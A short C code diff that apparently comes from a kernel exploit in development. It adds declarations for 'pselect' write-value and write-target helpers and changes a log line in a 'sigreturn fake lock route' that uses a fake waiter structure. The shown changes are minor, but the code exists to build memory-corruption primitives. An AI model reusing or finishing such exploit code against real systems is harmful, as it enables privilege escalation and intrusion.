@@ -24,6 +24,10 @@ extern int cfi_last_step;
 extern int cfi_last_errno;
 extern int cfi_dirty_seen;
 
+/* Functions from pselect route / slide logic */
+extern uint64_t pselect_write_value(void);
+extern uint64_t pselect_write_target(void);
+
 /* Internal state */
 static volatile int sigreturn_done = 0;
 static uint8_t g_fake_waiter[0x58];
@@ -118,7 +122,7 @@ void do_sigreturn_fake_lock_route(void) {
 
     atomic_store(&punch_consume_go, 0);
 
-    pr_info("sigreturn route done calls=%d success=%d step=%d errno=%d\\n",
-            atomic_load(&consumer_calls), atomic_load(&consumer_success),
-            cfi_last_step, cfi_last_errno);
+    pr_info("sigreturn route done=%d calls=%d success=%d step=%d errno=%d\\n",
+            route_verified, atomic_load(&consumer_calls),
+            atomic_load(&consumer_success), cfi_last_step, cfi_last_errno);
 }
